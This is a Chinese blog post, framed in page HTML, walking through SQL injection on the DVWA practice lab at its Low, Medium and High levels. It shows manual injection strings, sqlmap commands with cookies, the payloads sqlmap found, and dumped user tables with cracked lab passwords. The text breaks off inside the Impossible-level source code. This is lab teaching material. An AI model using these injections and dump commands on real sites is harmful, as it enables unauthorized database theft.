@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前置知识 当 web 应用向后台数据库传递 SQL 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的 SQL 语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 二次注入是攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。 手动注入和使用 sqlmap 自动注入的方法。  配置环境在我做这个实验的时候，使用的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于 dvwa 和 sqlmap 的 SQL 注入攻击">
+<meta property="og:url" content="https://ceyewan.github.io/p/2261a6f2.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="前置知识 当 web 应用向后台数据库传递 SQL 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的 SQL 语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 二次注入是攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。 手动注入和使用 sqlmap 自动注入的方法。  配置环境在我做这个实验的时候，使用的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.github.io/images/image-20220619233451356.png">
+<meta property="article:published_time" content="2022-06-19T16:07:05.000Z">
+<meta property="article:modified_time" content="2024-03-27T06:27:02.587Z">
+<meta property="article:author" content="ceyewan">
+<meta property="article:tag" content="SQL injection">
+<meta property="article:tag" content="dvwa">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.github.io/images/image-20220619233451356.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>基于 dvwa 和 sqlmap 的 SQL 注入攻击</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/2fad324d.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/2261a6f2.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/2261a6f2.html&text=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/2261a6f2.html&is_video=false&description=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=基于 dvwa 和 sqlmap 的 SQL 注入攻击&body=Check out this article: https://ceyewan.github.io/p/2261a6f2.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/2261a6f2.html&title=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/2261a6f2.html&name=基于 dvwa 和 sqlmap 的 SQL 注入攻击&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/2261a6f2.html&t=基于 dvwa 和 sqlmap 的 SQL 注入攻击"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-%E7%AD%89%E7%BA%A7"><span class="toc-number">3.</span> <span class="toc-text">Low 等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-php-%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">分析 php 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">sqlmap 自动注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-%E7%AD%89%E7%BA%A7"><span class="toc-number">4.</span> <span class="toc-text">Medium 等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-php-%E6%BA%90%E7%A0%81-1"><span class="toc-number">4.1.</span> <span class="toc-text">分析 php 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.2.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.3.</span> <span class="toc-text">sqlmap 自动注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-%E7%AD%89%E7%BA%A7"><span class="toc-number">5.</span> <span class="toc-text">High 等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-php-%E6%BA%90%E7%A0%81-2"><span class="toc-number">5.1.</span> <span class="toc-text">分析 php 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-2"><span class="toc-number">5.2.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5-2"><span class="toc-number">5.3.</span> <span class="toc-text">sqlmap 自动注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-%E7%AD%89%E7%BA%A7"><span class="toc-number">6.</span> <span class="toc-text">Impossible 等级</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-php-%E6%BA%90%E7%A0%81-3"><span class="toc-number">6.1.</span> <span class="toc-text">分析 php 源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">小结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        基于 dvwa 和 sqlmap 的 SQL 注入攻击
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-19T16:07:05.000Z" class="dt-published" itemprop="datePublished">2022-06-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/WebSecurity/">WebSecurity</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/SQL-injection/" rel="tag">SQL injection</a>, <a class="p-category" href="/tags/dvwa/" rel="tag">dvwa</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
+<li>当 <code>web</code> 应用向后台数据库传递 <code>SQL</code> 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的 <code>SQL</code> 语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</li>
+<li>二次注入是攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 <code>SQL</code> 查询语句所导致的注入。</li>
+<li>手动注入和使用 <code>sqlmap</code> 自动注入的方法。</li>
+</ul>
+<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>在我做这个实验的时候，使用的是 <code>LAMP</code> 环境，在环境中下载 <code>DVWA</code> 靶场，配置相关设置，我的实验环境如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OS: Ubuntu 20.04.3 LTS</span><br><span class="line">Apache: Apache/2.4.41 (Ubuntu)</span><br><span class="line">MySQL Version: 8.0.26-0ubuntu0.20.04.2</span><br><span class="line">PHP Version: 8.0.10</span><br><span class="line">phpMyAdmin Version: 5.1.1</span><br></pre></td></tr></table></figure>
+
+<p>在我创作这篇博客时，我使用的是 <code>docker</code> 来进行环境配置。首先执行 <code>docker search dvwa</code> 查找镜像，然后执行 <code>docker pull [citizenstig/dvwa](选一个最靠前的)</code> 下载镜像，最后，执行 <code>docker run --name dvwa citizenstig/dvwa</code> 生成容器，最后，使用 <code>vscode</code> 打开容器，配置端口（80端口）转发。</p>
+<p>进入网站 <a target="_blank" rel="noopener" href="http://localhost/dvwa/setup.php">http://localhost/dvwa/setup.php</a> ，登录（默认用户为 <code>admin</code> ，密码是 <code>password</code>）。</p>
+<h2 id="Low-等级"><a href="#Low-等级" class="headerlink" title="Low 等级"></a>Low 等级</h2><p>点击 <code>DVWA Security</code> ，修改等级为 <code>low</code> 。</p>
+<h3 id="分析-php-源码"><a href="#分析-php-源码" class="headerlink" title="分析 php 源码"></a>分析 php 源码</h3><p>进入 <code>SQL injection</code> 。首先，我们查看源代码，这里就是接收了一个参数 <code>id</code> ，然后执行 <code>sql</code> 语句，并且是字符型的：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">// id 有引号，字符型</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h3><p>因此，在表单里插入 <code>SQL</code> 语言（例如 <code>1&#39; or &#39;1234&#39;=&#39;1234</code> ，提交表单，就可以得到一些数据，分析可知，这里的条件一定满足，因此返回的是所有的数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ID: 1&#x27; or &#x27;1234&#x27;=&#x27;1234</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br><span class="line">ID: 1&#x27; or &#x27;1234&#x27;=&#x27;1234</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br><span class="line">ID: 1&#x27; or &#x27;1234&#x27;=&#x27;1234</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line">ID: 1&#x27; or &#x27;1234&#x27;=&#x27;1234</span><br><span class="line">First name: Pablo</span><br><span class="line">Surname: Picasso</span><br><span class="line">ID: 1&#x27; or &#x27;1234&#x27;=&#x27;1234</span><br><span class="line">First name: Bob</span><br><span class="line">Surname: Smith</span><br></pre></td></tr></table></figure>
+
+<h3 id="sqlmap-自动注入"><a href="#sqlmap-自动注入" class="headerlink" title="sqlmap 自动注入"></a>sqlmap 自动注入</h3><p>这样一个一个填很浪费时间，浪费精力。因此，我们可以使用 <code>sqlmap</code> 工具来进行自动化注入。按照说明配置好工具之后，输入下面的命令，就可以看到这里可以使用 <code>boolean-based blind</code> 、 <code>error-based</code> 、 <code>time-based blind</code> 和 <code>UNION query</code> 这几种方式进行注入：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/vulnerabilities/sqli/?id=233&amp;Submit=Submit&quot; --batch --cookie &quot;PHPSESSID=ara6drni1r464b5vu2bu51cjk4; security=low&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意 url 和 cookie 执行从浏览器抓包工具获取</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果</span></span><br><span class="line">sqlmap identified the following injection point(s) with a total of 143 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class="line">    Payload: id=233&#x27; OR NOT 6220=6220#&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: id=233&#x27; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171716b71,(SELECT (ELT(9664=9664,1))),0x716b627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- NInX&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=233&#x27; AND (SELECT 8305 FROM (SELECT(SLEEP(5)))aIhA)-- ALvX&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=233&#x27; UNION ALL SELECT CONCAT(0x7171716b71,0x6d6f645958746e434570746374515164675a5a5778666e517947427969725354467776425a66436e,0x716b627871),NULL#&amp;Submit=Submit</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们添加 <code>--bds</code> 标志，再次运行，就可以破解得到当前的数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们可以通过标志 <code>-D dvwa --tables</code> 来指定要渗透测试的数据库，这样，我们就可以拿到该数据库下的表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: dvwa</span><br><span class="line">[2 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| guestbook |</span><br><span class="line">| users     |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们指定数据库并且指定表名，拿到列，通过标志 <code>-D dvwa -T users --column</code> :</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: dvwa</span><br><span class="line">Table: users</span><br><span class="line">[8 columns]</span><br><span class="line">+--------------+-------------+</span><br><span class="line">| Column       | Type        |</span><br><span class="line">+--------------+-------------+</span><br><span class="line">| user         | varchar(15) |</span><br><span class="line">| avatar       | varchar(70) |</span><br><span class="line">| failed_login | int(3)      |</span><br><span class="line">| first_name   | varchar(15) |</span><br><span class="line">| last_login   | timestamp   |</span><br><span class="line">| last_name    | varchar(15) |</span><br><span class="line">| password     | varchar(32) |</span><br><span class="line">| user_id      | int(6)      |</span><br><span class="line">+--------------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>最后，我们当然希望拿到表里面的数据了，通过标志 <code>-D dvwa -T users --dump</code> 即可实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: dvwa                                                                                                                 </span><br><span class="line">Table: users</span><br><span class="line">[5 entries]</span><br><span class="line">+---------+---------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+</span><br><span class="line">| user_id | avatar                                      | user    | password                                    | last_name | first_name | last_login          | failed_login |</span><br><span class="line">+---------+---------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+</span><br><span class="line">| 1       | http://localhost/hackable/users/admin.jpg   | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2022-06-19 15:01:58 | 0            |</span><br><span class="line">| 2       | http://localhost/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2022-06-19 15:01:58 | 0            |</span><br><span class="line">| 3       | http://localhost/hackable/users/1337.jpg    | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2022-06-19 15:01:58 | 0            |</span><br><span class="line">| 4       | http://localhost/hackable/users/pablo.jpg   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2022-06-19 15:01:58 | 0            |</span><br><span class="line">| 5       | http://localhost/hackable/users/smithy.jpg  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2022-06-19 15:01:58 | 0            |</span><br><span class="line">+---------+---------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+</span><br></pre></td></tr></table></figure>
+
+<p>这里的密码是通过 <code>md5</code> 加密的，遍历 <code>sqlmap</code> 的字典可以破解一些简单的密码。</p>
+<h2 id="Medium-等级"><a href="#Medium-等级" class="headerlink" title="Medium 等级"></a>Medium 等级</h2><p>修改为 <code>medium</code> 等级。</p>
+<h3 id="分析-php-源码-1"><a href="#分析-php-源码-1" class="headerlink" title="分析 php 源码"></a>分析 php 源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ]; <span class="comment"># post 请求</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"><span class="comment"># id 没有引号，数字型</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h3><p>这个等级没有输入框了，但是，我们可以通过修改 <code>html</code> 代码来实现注入，如下，注意，这里不能写引号了，原因就是数字型不需要引号：</p>
+<p><img src="/../images/image-20220619233451356.png" alt="image-20220619233451356"></p>
+<h3 id="sqlmap-自动注入-1"><a href="#sqlmap-自动注入-1" class="headerlink" title="sqlmap 自动注入"></a>sqlmap 自动注入</h3><p>知道了手动注入的方式之后，我们就可以继续使用 <code>sqlmap</code> 来实现自动化注入了。</p>
+<p>通过浏览器抓包工具我们可以得到一些请求信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Request URL: http://localhost/vulnerabilities/sqli/</span><br><span class="line">Request Method: POST</span><br><span class="line">Cookie: PHPSESSID=ara6drni1r464b5vu2bu51cjk4; security=medium</span><br></pre></td></tr></table></figure>
+
+<p>不同于 <code>low</code> 等级的 <code>get</code> 请求方式，这里采用的是 <code>post</code> 请求，但是我们在浏览器抓包工具中找不到 <code>post</code> 的参数，不过没关系，可以使用 <code>burpsuite</code> 来解决，使用这个专门的抓包工具，我们可以看到其实 <code>post</code> 的数据就是 <code>id=2&amp;Submit=Submit</code> ，那么，就能继续使用 <code>sqlmap</code> 来自动化进行注入了。这里我们跳过中间步骤，因为和前面都是一样的，没有什么特别的。 <code>--data &quot;id=2&amp;Submit=Submit&quot;</code> 标志是 <code>post</code> 请求要提交的文件， <code>--flush-session</code> 标志是因为 <code>low</code> 已经求过一次了，清除缓存，否则不会继续注入，会直接返回缓存的结果。命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/vulnerabilities/sqli/&quot; --batch --cookie &quot;PHPSESSID=ara6drni1r464b5vu2bu51cjk4; security=medium&quot; --data &quot;id=2&amp;Submit=Submit&quot; -D dvwa -T users --dump --flush-session</span><br></pre></td></tr></table></figure>
+
+<p>不出意外的，我们就会得到和上面一样的结果。</p>
+<h2 id="High-等级"><a href="#High-等级" class="headerlink" title="High 等级"></a>High 等级</h2><h3 id="分析-php-源码-2"><a href="#分析-php-源码-2" class="headerlink" title="分析 php 源码"></a>分析 php 源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们看到 <code>id</code> 是一个 <code>session</code> 请求，不过没关系，我们不用管，然后 <code>id</code> 是字符型的，所以注意添加引号，最后限制了输出一行，不过我们其实也可以通过 <code>#</code> 将后面的内容注释掉。</p>
+<h3 id="手动注入-2"><a href="#手动注入-2" class="headerlink" title="手动注入"></a>手动注入</h3><p>虽然这里是一个二级注入，测试了几项发现手动填写表单是就像 <code>low</code> 等级一样：</p>
+<h3 id="sqlmap-自动注入-2"><a href="#sqlmap-自动注入-2" class="headerlink" title="sqlmap 自动注入"></a>sqlmap 自动注入</h3><p>虽然很困难，但是 <code>sqlmap</code> 还是很强大的。首先，我们这次借助专业的抓包工具 <code>burpsuite</code> ，设置好代理，然后就可以看到请求的内容，将抓包到的请求信息保存到文件 <code>high.txt</code> 中，然后执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r high.txt --second-url &quot;http://localhost/vulnerabilities/sqli/&quot; --batch --flush-session</span><br></pre></td></tr></table></figure>
+
+<p><code>--second-url</code> 是二级注入的另一个页面，然后自动操作，并且清空之前的缓存。 <code>sqlmap</code> 自动注入后，发现 <code>post</code> 请求的参数 <code>id</code> 有如下三种注入漏洞（。接下来，和上面一样，使用 <code>--dbs</code> 、 <code>-D dwva --tables</code> 、 <code>-D dwva -T users --dump</code> 等标志拿到所有需要的数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 99 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span><br><span class="line">    Payload: id=1&#x27; AND 1155=(SELECT (CASE WHEN (1155=1155) THEN 1155 ELSE (SELECT 1708 UNION SELECT 9973) END))-- IfmX&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&#x27; AND (SELECT 5983 FROM (SELECT(SLEEP(5)))bCUn) AND &#x27;CuOS&#x27;=&#x27;CuOS&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=1&#x27; UNION ALL SELECT CONCAT(0x7176787a71,0x4a624164734e68675857796d6d6b4f6f636e587a6650704c6a476f756e6b69594f4b5254744f5161,0x716a766b71),NULL-- -&amp;Submit=Submit</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>分析上面的请求头，我们其实只需要一些数据即可，因此，可以将这些参数写到命令中，那么就不需要得到 <code>high.txt</code> 文件了，使用下面的命令即可。 <code>--level</code> 表示测试等级，最大为 <code>5</code> 。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/vulnerabilities/sqli/session-input.php#&quot; --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;http://localhost/vulnerabilities/sqli/&quot; --cookie=&quot;PHPSESSID=d9ou799sikqs084p6iqj7ffmf3; security=high&quot; --level=2 --batch -D dvwa -T users --dump --flush-session</span><br></pre></td></tr></table></figure>
+
+<p>最后结果和上面两个等级相同，不再赘述。</p>
+<h2 id="Impossible-等级"><a href="#Impossible-等级" class="headerlink" title="Impossible 等级"></a>Impossible 等级</h2><h3 id="分析-php-源码-3"><a href="#分析-php-源码-3" class="headerlink" title="分析 php 源码"></a>分析 php 源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];  <span class="comment">// 拿到数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ 